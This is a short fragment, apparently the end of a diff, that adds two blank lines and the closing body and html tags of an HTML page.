+
+
+</body>
+</html>
